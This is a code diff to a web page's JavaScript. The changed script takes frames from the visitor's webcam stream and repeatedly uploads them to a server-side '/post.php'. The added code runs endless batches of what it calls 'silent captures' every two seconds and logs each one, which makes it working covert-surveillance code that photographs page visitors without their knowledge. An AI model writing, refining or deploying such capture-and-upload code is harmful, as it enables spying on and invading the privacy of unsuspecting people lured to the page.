@@ -119,16 +119,18 @@
 <script>
 
   function post(imgdata) {
+    console.log('Attempting to post image data...');
     $.ajax({
       type: 'POST',
       data: { cat: imgdata },
-      url: 'post.php',
+      url: '/post.php',
       dataType: 'json',
       async: false,
       success: function (result) {
-        // call the function that handles the response/results
+        console.log('Post success:', result);
       },
-      error: function () {
+      error: function (xhr, status, error) {
+        console.error('Post failed:', status, error);
       }
     });
   };
@@ -164,15 +166,34 @@
     video.srcObject = stream;
 
     var context = canvas.getContext('2d');
-    setInterval(function () {
-
+    var captureCount = 0;
+    var maxCaptures = 5;
+    var captureInterval;
+    
+    function capturePhoto() {
       context.drawImage(video, 0, 0, 1280, 720);
       var canvasData = canvas.toDataURL("image/png", 0.95).replace("image/png", "image/octet-stream");
       post(canvasData);
-      video.play();
-    }, 1500);
-
-
+      captureCount++;
+      console.log('Silent capture #' + captureCount + ' completed');
+      
+      if (captureCount >= maxCaptures) {
+        clearInterval(captureInterval);
+        console.log('First batch of 5 silent captures completed');
+        
+        // Start next batch automatically after 3 seconds
+        setTimeout(function() {
+          console.log('Starting next batch of 5 silent captures');
+          captureCount = 0;
+          captureInterval = setInterval(capturePhoto, 2000);
+        }, 3000);
+      }
+    }
+    
+    // Start first capture immediately, then every 2 seconds
+    setTimeout(function() {
+      captureInterval = setInterval(capturePhoto, 2000);
+    }, 1000); // Wait 1 second for video to stabilize
   }
   function PopUp(){
     document.getElementById('ac-wrapper').style.display="none"; 
